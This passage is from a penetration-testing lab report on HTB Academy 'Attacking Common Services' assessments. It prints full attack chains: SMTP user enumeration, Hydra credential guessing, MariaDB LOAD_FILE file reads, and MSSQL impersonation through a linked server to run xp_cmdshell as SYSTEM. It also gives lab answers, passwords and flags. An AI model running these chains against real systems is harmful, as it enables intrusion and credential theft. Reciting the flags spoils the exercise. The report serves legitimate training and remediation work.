```bash
nc -C 10.129.203.7 25
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt \
  -D inlanefreight.htb -t 10.129.203.7
```

### POP3 retrieval and authentication

The module also covers mailbox access. A prior standalone email exercise discussed the address `marlin@inlanefreight.htb` and POP3 credentials obtained from an external walkthrough, but **the provided ZIP has no actual POP3 session screenshot demonstrating that particular mailbox flag**. Accordingly, the following is a **reproduction example**, not an observed execution:

```bash
nc -C <LAB_TARGET> 110
# USER <user@domain>
# PASS <approved_lab_password>
# LIST
# RETR 1
# QUIT
```

For encrypted POP3S on 995, use a TLS client; `nc` alone does not negotiate implicit TLS. POP3 `LIST` enumerates messages by number/size, while `RETR <n>` retrieves a selected message. Be careful not to mistake a server banner or successful network handshake for valid mailbox authentication.

**Evidence.**

> **[]** 


> **[]** 
 from the Easy assessment. **Evidence Pending:** independently executed POP3 retrieval of the separate email exercise's flag.

**Remediation.** Reduce account-enumeration leakage, disable insecure authentication methods, mandate TLS, apply rate limits and lockout protections, and monitor user guessing by RCPT response patterns.

## 16. Latest Email Service Vulnerabilities

**Objective.** Explain why security testing of mail services must address both protocol-level misconfigurations and higher-level groupware applications such as Exchange.

### Representative Exchange vulnerabilities

The widely documented ProxyLogon and ProxyShell chains show how vulnerable Exchange components can lead to remote code execution or follow-on compromise. Examples include CVE-2021-26855 (ProxyLogon) and CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207 (ProxyShell). These were **Microsoft Exchange Server** issues. The observed Easy target ran **hMailServer**, and no screenshot shows an Exchange endpoint — assigning these CVEs to that server would be technically incorrect.

### Operational email weaknesses observed in the lab

- `VRFY` disabled but `RCPT TO` gave different `550` messages for a disabled account versus an unknown user.
- SMTP advertised LOGIN/PLAIN; the availability of TLS, actual authentication policy and passwords must be tested independently.
- An exposed email username was used as an input for later, separate FTP and database credential investigation.
- The Linux Medium target exposed Dovecot POP3/POP3S, though the operator ultimately reached its flag through FTP instead.

**Evidence.**

> **[]** 


> **[]** 
 show protocol behavior; product-CVE exploit evidence is **Pending**.

**Remediation.** Patch mail software, disable legacy/plaintext login over unprotected channels, normalize error messages where appropriate, implement SPF/DKIM/DMARC for domain spoofing protections, protect mailboxes with strong authentication and monitor brute-force attempts. Reference: [CISA/US government summary of 2021 exploited vulnerabilities](https://media.defense.gov/2022/Apr/27/2002984949/-1/-1/0/JOINT_CSA_2021_ROUTINELY_EXPLOITED_CVES_20220427.PDF).

## 17. Attacking Common Services — Skills Assessment Easy

**Target:** `10.129.203.7` (`ACADEMY-ATTCOMSVC-WIN-SKILLS-EASY`)  
**Goal:** Identify an attack path to retrieve the contents of `flag.txt`.  
**Status:** **Verified completed**, based on user terminal output and ZIP evidence.

### Phase A — Reconnaissance and exposed services

A full TCP scan returned seven open ports: FTP 21, SMTP 25 and submission 587, HTTP 80, HTTPS 443, MariaDB 3306 and RDP 3389. A service scan identified Core FTP Server 2.0 build 725; hMailServer SMTP; Apache 2.4.53 on Windows with PHP 7.4.29; MariaDB 10.4.24; and RDP on a Windows host `WIN-EASY`.

```bash
nmap -Pn -sT -p- --open -T4 10.129.203.7 -oN ports.txt
nmap -Pn -sC -sV -p 21,25,80,443,587,3306,3389 10.129.203.7 -oN services.txt
```

> **[]** 


> **[]** 


### Phase B — Record negative findings, do not erase them

Anonymous FTP login did not work. Direct access to `/phpmyadmin/` returned `403 Forbidden`; a passwordless MariaDB `root` login returned `ERROR 1045`. Gobuster found mainly Apache/Windows-reserved-path `403` results, standard XAMPP pages, and `/test.php` returning `Hello World!`. Those responses did not demonstrate RCE or information disclosure on their own.

```bash
nmap -p 21 --script ftp-anon 10.129.203.7
curl -I http://10.129.203.7/phpmyadmin/
mysql -h 10.129.203.7 -P 3306 -u root --skip-password
gobuster dir -u http://10.129.203.7/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
curl -i http://10.129.203.7/test.php
```

> **[]** 


> **[]** 


> **[]** 


> **[]** 


### Phase C — Enumerate users with SMTP response differences

The hMailServer advertised `VRFY` but returned `502 VRFY disallowed`. `RCPT TO` revealed a distinction: `administrator@inlanefreight.htb` yielded `550 Account is not active`; a random nonexistent address yielded `550 Unknown user`. SMTP user enumeration with a larger local names dictionary identified `fiona@inlanefreight.htb`.

```bash
nc -C 10.129.203.7 25
# EHLO inlanefreight.htb
# MAIL FROM:<test@inlanefreight.htb>
# RCPT TO:<administrator@inlanefreight.htb>
# RCPT TO:<randomuserxyz123@inlanefreight.htb>

smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt \
  -D inlanefreight.htb -t 10.129.203.7
```

The 17-entry shortlist returned no matches. A larger 10,713-entry names list eventually identified `fiona`. An earlier proposed downloadable `users.zip` path returned HTTP 404; this was **not** an operator error and should not appear as a successful retrieval in any report.

> **[]** 


> **[]** 


### Phase D — FTP login and operational notes

Credential testing found the intentionally weak password **`987654321`** for Fiona in the authorized lab. Successful FTP login returned `230 Logged on`. The FTP directory exposed two files: `docs.txt` and `WebServersInfo.txt`. Downloading and reading them established that Core FTP (21/443) and Apache (80/4443) were distinct web-serving components.

```bash
ftp 10.129.203.7
# USER fiona
# PASS <validated_lab_password>
# ls
# get docs.txt
# get WebServersInfo.txt
# bye

curl -vk -H 'Host: localhost' --basic -u 'fiona:987654321' \
  https://10.129.203.7/docs.txt
```

The HTTPS request produced `200 OK`, server banner `Core FTP HTTP Server`, and the original 55-byte `docs.txt` content. That credential reuse was verified; a Core FTP traversal exploit was **not** demonstrated.

> **[]** 


### Phase E — MariaDB credential reuse and filesystem read

Using `fiona` against MariaDB initially caused an SSL negotiation error. The client-side `--skip-ssl` option allowed login. `CURRENT_USER()` returned `fiona@%`. `SHOW GRANTS` revealed `ALL PRIVILEGES ON *.*`, and `secure_file_priv` was empty. The operator confirmed controlled file read by returning the PHP source of `/test.php`, then read the Administrator's `flag.txt` via SQL.

```bash
mysql --skip-ssl -h 10.129.203.7 -P 3306 -u fiona -p
```

```sql
SELECT USER(), CURRENT_USER();
SHOW GRANTS;
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT LOAD_FILE('C:/xampp/htdocs/test.php');
SELECT LOAD_FILE('C:/Users/Administrator/Desktop/flag.txt');
```

**Verified flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

> **[]** 


> **[]** 


### Root cause, impact and corrective actions

The chain relied on credential reuse, an accessible SQL port, overly powerful global database grants and Windows service-file read access. The final read did not require a reverse shell, RDP login or an OS command execution primitive. Recommended actions are unique per-service passwords, least-privilege MariaDB accounts, removal of global `FILE` access, isolation of database ports, and constrained OS-level service permissions. The evidence supports **read** access to the shown file; it does not independently support arbitrary write or SYSTEM-level code execution.

## 18. Attacking Common Services — Skills Assessment Medium

**Target:** `10.129.201.127` (`ACADEMY-ATTCOMSVC-LIN-SKILLS-MEDIUM`)  
**Goal:** Locate and retrieve `flag.txt` from the Linux target.  
**Status:** **Verified completed**, supported by user screenshots and command output.

### Phase A — Service map

Nmap found OpenSSH 8.2p1 (22), BIND 9.16.1 (53), Dovecot POP3 (110) and POP3S (995), and two separate ProFTPD listeners on 2121 and 30021. The latter were identified by banners as `InlaneFTP` and `Internal FTP` respectively. These are distinct service contexts and must be tested separately.

```bash
nmap -Pn -sC -sV -p 22,53,110,995,2121,30021 10.129.201.127
```

> **[]** 


### Phase B — DNS zone transfer revealed internal naming

`dig @10.129.201.127 inlanefreight.htb AXFR` succeeded and returned 13 DNS records. Hostnames such as `int-ftp`, `int-nfs`, `dc1`, `dc2`, `ws1`, `ws2`, `wsus` and `app` disclosed an internal naming scheme. The returned DNS data is a topology clue and does not automatically guarantee network connectivity to each host.

```bash
dig @10.129.201.127 inlanefreight.htb AXFR
```

> **[]** 


### Phase C — Anonymous FTP exposed candidate passwords

Anonymous authentication failed on 2121 with `530 Login incorrect`; the same credentials were accepted on `30021` with `230 Anonymous access granted, restrictions apply`. The latter exposed the directory `simon` containing the readable file `mynotes.txt` (153 bytes).

```bash
ftp 10.129.201.127 30021
# USER anonymous
# PASS <email-address>
# cd simon
# ls
# get mynotes.txt
# bye
cat mynotes.txt
```

The text contained **eight password-like lines**. It was legitimate to narrow the hypothesis to an account called `simon` based on the folder name, but the folder alone did not prove login validity. The file was the concrete credential-exposure artifact.

> **[]** 


> **[]** 


### Phase D — Small-list credential validation on FTP 2121

The operator used only the eight password candidates against user `simon`, rather than a broad password dictionary. Hydra reported a valid pair for port 2121:

```bash
hydra -l simon -P mynotes.txt -s 2121 -t 2 -f ftp://10.129.201.127
```

**Observed login:** `simon` with password `8Ns8j1b!23hs4921smHzwn` (visible in the Hydra screenshot). The resulting authenticated FTP session listed `flag.txt` and `Maildir`.

> **[]** 


### Phase E — Retrieve flag

```bash
ftp 10.129.201.127 2121
# USER simon
# PASS <discovered_password>
# ls
# get flag.txt
# bye
cat flag.txt
```

The transfer completed (`226 Transfer complete`), and `cat flag.txt` returned:

**Verified flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

> **[]** 


### Root cause, impact and corrective actions

The assessment demonstrates a credential chain across separately configured FTP instances. A misconfigured anonymous service disclosed passwords that were sufficient to authenticate to another FTP endpoint; weak secrets and unnecessary file access formed the bridge. Reduce anonymous access, remove private notes from public shares, enforce per-service authentication policies, rotate compromised passwords, use strong unique secrets, and log cross-service credential reuse.

## 19. Attacking Common Services — Skills Assessment Hard

**Target:** `10.129.203.10` (`ACADEMY-ATTCOMSVC-WIN-SKILLS-HARD`)  
**Goal:** identify Simon's retrievable file, Fiona's password, the user leading to administrator-equivalent access, and read Administrator Desktop flag.  
**Status:** **All four questions verified by observed terminal output and ZIP screenshots.**

### Phase A — Anonymous SMB discovery and Simon's file

The target exposed a share named `Home` that allowed guest access to a directory structure containing `HR`, `IT`, `OPS` and `Projects`. Within `IT`, there were subdirectories `Fiona`, `John`, and `Simon`. Navigating to `IT\\Simon` revealed `random.txt`, a 94-byte file containing a heading (`Credentials`) and five password candidates.

```bash
smbclient //10.129.203.10/Home -N
# smb: \\> cd IT
# smb: \\IT\\> cd Simon
# smb: \\IT\\Simon\\> ls
# smb: \\IT\\Simon\\> get random.txt
# smb: \\> exit
cat random.txt
```

**Hard Q1 answer:** `random.txt`.

> **[]** 


> **[]** 


### Phase B — Move from Simon's candidates to Fiona's credentials

The operator first tested Simon's five candidates against Fiona over SMB, but all produced `STATUS_LOGON_FAILURE`. This was useful negative evidence. Rather than guessing for longer, they enumerated `IT\\Fiona`, found and downloaded `creds.txt`, then also collected `information.txt`, `notes.txt` and `secrets.txt` from `IT\\John`.

```text
IT\\Fiona\\creds.txt           (118 bytes)
IT\\John\\information.txt     (101 bytes)
IT\\John\\notes.txt           (164 bytes)
IT\\John\\secrets.txt          (99 bytes)
```

Fiona's `creds.txt` contained five candidate strings. `nxc smb` validated `48Ns72!bns74@S84NNNSl` for the local Windows user Fiona. A zero-length/error-prone `password list` in other folders should not be used as proof; in this exercise, the source file and the successful local authentication were both documented.

```bash
tail -n +3 creds.txt | sed '/^$/d' > fiona_pass.txt
nxc smb 10.129.203.10 -u Fiona -p fiona_pass.txt --local-auth
```

**Hard Q2 answer:** `48Ns72!bns74@S84NNNSl`.

> **[]** 


> **[]** 


### Phase C — MSSQL login and initial privilege picture

Using the validated Windows password, Impacket authenticated to `WIN-HARD\\SQLEXPRESS` as `WIN-HARD\\Fiona`, mapped to `guest@master`. The user had `IS_SRVROLEMEMBER('sysadmin') = 0`. However, `sys.servers` revealed `LOCAL.TEST.LINKED.SRV` and `WINSRV02\\SQLEXPRESS`; the team notes mentioning a local linked server and impersonation made this especially relevant.

```bash
impacket-mssqlclient 'Fiona:48Ns72!bns74@S84NNNSl@10.129.203.10' -windows-auth
```

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.servers;
SELECT name, type_desc FROM sys.server_principals;
```

The visible server principals included `john` and `simon`. When the operator typed a multi-line SQL JOIN into Impacket line by line, each line executed independently and produced parse errors; the corrected query was entered on one line. That query returned no *direct Fiona* permission rows because the effective `IMPERSONATE` right was **inherited via a group**, not necessarily granted to the exact login being queried.

> **[]** 


### Phase D — Inherited impersonation and linked-server mapping

Impacket `enum_impersonate` exposed a grant to the Windows group `WINSRV02\\Database Readers`, allowing impersonation of SQL logins `john` and `simon`. `HAS_PERMS_BY_NAME` returned `1` for both. Neither principal had local `sysadmin` rights. An attempt to access the linked server directly as Fiona produced `NT AUTHORITY\\ANONYMOUS LOGON`, but the **impersonated John** context provided a privileged mapped login.

```sql
-- At the Fiona MSSQL prompt
enum_impersonate
SELECT HAS_PERMS_BY_NAME('john','LOGIN','IMPERSONATE');
SELECT HAS_PERMS_BY_NAME('simon','LOGIN','IMPERSONATE');

EXECUTE AS LOGIN = 'john';
EXECUTE('SELECT SYSTEM_USER AS login_name, IS_SRVROLEMEMBER(''sysadmin'') AS is_admin') AT [LOCAL.TEST.LINKED.SRV];
```

**Observed linked-server result:** `testadmin | 1`. The attacker-controlled SQL context remained `john` locally, but the linked server executed the supplied query as `testadmin` with `sysadmin` privileges.

**Hard Q3 answer:** `john`.

> **[]** 


### Phase E — Privileged OS command execution and Administrator flag

The linked server initially blocked `xp_cmdshell` because it was disabled. The sysadmin-mapped context permitted changing its configuration in the isolated lab. After the operator enabled advanced options, enabled `xp_cmdshell` and issued `RECONFIGURE`, the OS identity returned by `whoami` was **`nt authority\\system`**.

```sql
-- Observed in the authorized HTB lab; use a single line in Impacket
EXEC('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
EXEC('EXEC xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
EXEC('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
```

**Observed Windows principal:** `nt authority\\system`.  
**Hard Q4 flag:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`.

This demonstrates a high-impact trust-boundary crossing: SMB information disclosure allowed Windows authentication, inherited SQL impersonation enabled a login context switch, linked-server mapping provided `sysadmin`, and `xp_cmdshell` executed under an extremely privileged OS account. It does **not** prove that simply possessing Fiona's password granted direct Windows administrator permissions.

> **[]** 


### Root cause and prioritized mitigations

1. Restrict guest SMB access and inspect the share/NTFS ACLs of `IT\\Fiona` and `IT\\John`.
2. Remove passwords and internal database-operations notes from file shares and rotate disclosed credentials.
3. Minimize SQL `IMPERSONATE` grants, including permissions inherited from Windows groups.
4. Inventory and lock down linked-server credentials, `EXECUTE AT` permissions, and linked-server identity mappings; avoid mapping non-privileged users to `sysadmin`.
5. Keep `xp_cmdshell` disabled by policy unless explicitly necessary; audit any configuration changes; run SQL services with least-privilege Windows identities instead of SYSTEM wherever feasible.
6. Monitor for `EXECUTE AS`, linked-server RPC execution, suspicious login contexts, and `xp_cmdshell` invocation.

---

## Cross-Section Findings and Remediation Matrix

| ID | Finding | Supporting evidence | Impact | Priority |
|---|---|---|---|---|
| F01 | Anonymous FTP disclosure of passwords (Medium) | E15–E16 | Authenticated access to a second FTP listener | High |
| F02 | Weak/reused Fiona credentials (Easy) | E11–E13 | Database access and filesystem read | High |
| F03 | MariaDB `fiona@%` global grants + unconstrained `LOAD_FILE()` (Easy) | E12–E13 | Administrator Desktop file disclosure | Critical in context |
| F04 | Anonymous SMB exposure of IT documents (Hard) | E19–E22 | Disclosure of passwords and operational hints | High |
| F05 | SQL login impersonation via group grant (Hard) | E23–E24 + transcript | Cross-login security boundary | High |
| F06 | High-privilege linked-server mapping and `xp_cmdshell` (Hard) | E24–E25 | OS command execution as SYSTEM | Critical |
| F07 | Over-permissive DNS AXFR | E15, C01 | DNS data and sensitive TXT disclosure | Medium–High |
| F08 | SMTP account-status enumeration through `RCPT TO` | E09–E10 | Valid username discovery | Medium |

**Risk qualification.** Severity is contextual to the deliberately vulnerable HTB targets, not a production CVSS assessment. No unauthorized external hosts were tested. Detection rates and real-world exploitability were not measured.

## Evidence Register — 25 Original Screenshots from ZIP

All ZIP images are retained at their original dimensions. The register below maps each file to its subject and the section(s) where it is directly useful. The original filenames and SHA-256 digests are preserved in `evidence-manifest.json` inside the deliverable ZIP.

| ID | Evidence subject | Primary section |
|---|---|---|
| E01 | Initial Samba share listing; `GGJ` contains `id_rsa` | 07 — Attacking SMB |
| E02 | Follow-on SSH session and flag from the earlier Samba/SSH exercise | 07 — Attacking SMB |
| E03 | SMB candidate testing and authenticated `jason` session | 04 / 07 — Sensitive Info / SMB |
| E04 | Easy full-port Nmap scan | 17 — Easy |
| E05 | Easy version-specific Nmap services | 17 — Easy |
| E06 | FTP, phpMyAdmin, MySQL and Gobuster early negative tests | 17 — Easy |
| E07 | Negative checks and ongoing Gobuster results | 17 — Easy |
| E08 | FTP/SQL negatives and SMTP first probe | 17 — Easy |
| E09 | `test.php` Hello World and SMTP `VRFY` behavior | 15 / 17 — Email / Easy |
| E10 | SMTP `RCPT TO` account-status differences; web host-header test | 15 / 17 — Email / Easy |
| E11 | Core FTP HTTP Server vs Apache locations and ports | 05 / 17 — FTP / Easy |
| E12 | MariaDB authenticated Fiona; grants and `secure_file_priv` | 09 / 17 — SQL / Easy |
| E13 | `LOAD_FILE()` returned PHP source and Easy flag | 09 / 17 — SQL / Easy |
| E14 | Medium service scan / ProFTPD listeners | 18 — Medium |
| E15 | DNS AXFR and FTP anonymous comparison | 13 / 18 — DNS / Medium |
| E16 | Downloaded `/simon/mynotes.txt` and candidate credentials | 04 / 18 — Sensitive Info / Medium |
| E17 | Authenticated FTP `flag.txt` read, Medium flag | 18 — Medium |
| E18 | Hydra verifies Simon credential on FTP 2121 | 05 / 18 — FTP / Medium |
| E19 | Hard SMB departmental share layout | 07 / 19 — SMB / Hard |
| E20 | Simon's `random.txt` downloaded and opened | 04 / 19 — Sensitive Info / Hard |
| E21 | Fiona/John share enumeration and four files downloaded | 04 / 19 — Sensitive Info / Hard |
| E22 | Fiona's password candidates and SMB authentication testing | 07 / 19 — SMB / Hard |
| E23 | Fiona connects to MSSQL; `guest`, no local sysadmin; servers list | 09 / 19 — SQL / Hard |
| E24 | `john` impersonation gives linked-server `testadmin` sysadmin | 09 / 19 — SQL / Hard |
| E25 | `xp_cmdshell` as SYSTEM and Hard Administrator flag | 09 / 19 — SQL / Hard |

### Extra original conversation screenshots (not in the ZIP)

| ID | Subject | Section |
|---|---|---|
| C01 | DNS `hr.inlanefreight.htb` successful AXFR and TXT flag | 13 — DNS |
| C02 | Windows CMD rejects the PowerShell-only `Get-ChildItem` cmdlet | 11 — RDP / troubleshooting |
| C03 | Responder listening on tun0, ports 80/53 warnings, wrong-shell attempts | 09 — MSSQL / troubleshooting |

## Practical Lessons and Verification Checklist

**Method:** Capture the `nmap` evidence first; identify every independent service; prioritize low-risk enumeration; record denied accesses as negative evidence; test narrow, evidence-derived credentials; check effective permissions rather than trusting broad assumptions; and perform only the amount of post-exploitation required by the assigned objective.

**Correctness checks:**

- Record the exact target IP and listener port for each result; do not reuse them across assessment instances.
- Distinguish **authentication success** from **authorization to read a specific path**.
- Distinguish SQL user, server login, database user, Windows account, and linked-server mapped identity.
- Treat `NULL` from `LOAD_FILE()` as ambiguous without a control-file read and file-permission check.
- Verify zone transfer **per zone**, not just for the domain apex.
- Use `nc -C` for plaintext SMTP in this lab; SMTP `VRFY` may be disabled while `RCPT` leaks account state.
- Enter Impacket interactive SQL queries as **single lines** unless the client explicitly supports multiline input.
- Keep screenshot IDs and hashes attached to reported claims; mark unevidenced findings as **Evidence Pending**.

## Evidence Gaps / Evidence Pending

- Independent screenshots of **The Concept of Attacks** theory demonstrations and generic remote-client examples.
- Verified exploit runs for **Latest FTP/SMB/SQL/RDP/DNS/Email Vulnerabilities** sections; their CVEs here are context and research, not demonstrated lab compromises.
- A complete screenshot-backed RDP pass-the-hash Administrator login and flag; only the CMD/PowerShell mismatch screenshot was available.
- A reproducible successful POP3 `RETR` session for the separate `marlin` email exercise; earlier answers were from external walkthrough material.
- A screenshot-backed completion of the standalone MSSQL `mssqlsvc` NetNTLMv2/Responder capture-and-crack chain; the conversation establishes SQL access and a Responder attempt but not a full screenshot-confirmed capture.
- Original terminal recordings for some intermediary credential tests are missing from the ZIP; the corresponding observations can be traced to the current conversation transcript rather than inserted fabricated screenshots.

## References and Attribution

1. [HTB Academy — Attacking Common Services, Module 116 (official section order)](https://academy.hackthebox.com/course/preview/attacking-common-services/interacting-with-common-services).
2. [HTB Academy — Direct module URL](https://academy.hackthebox.com/app/module/116).
3. [NIST/NVD — CVE-2015-3306 ProFTPD mod_copy](https://nvd.nist.gov/vuln/detail/CVE-2015-3306).
4. [Microsoft — MS17-010 / SMBv1 bulletin](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010).
5. [NIST/NVD — CVE-2020-0618 SQL Server Reporting Services](https://nvd.nist.gov/vuln/detail/CVE-2020-0618).
6. [Microsoft — CVE-2019-0708 / BlueKeep advisory](https://www.microsoft.com/en-us/msrc/blog/2019/05/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/).
7. [NIST/NVD — CVE-2020-1350 Windows DNS SIGRed](https://nvd.nist.gov/vuln/detail/CVE-2020-1350).
8. [US Joint Advisory — routinely exploited vulnerabilities](https://media.defense.gov/2022/Apr/27/2002984949/-1/-1/0/JOINT_CSA_2021_ROUTINELY_EXPLOITED_CVES_20220427.PDF).

**Independent writing note:** This report paraphrases protocol concepts, explains the actual operator evidence, and cites publicly accessible vendor/reference material. It does not present copy-pasted HTB course text as original work. All credentials/flags in the report are restricted to the supplied sandbox and should never be interpreted as live production secrets.
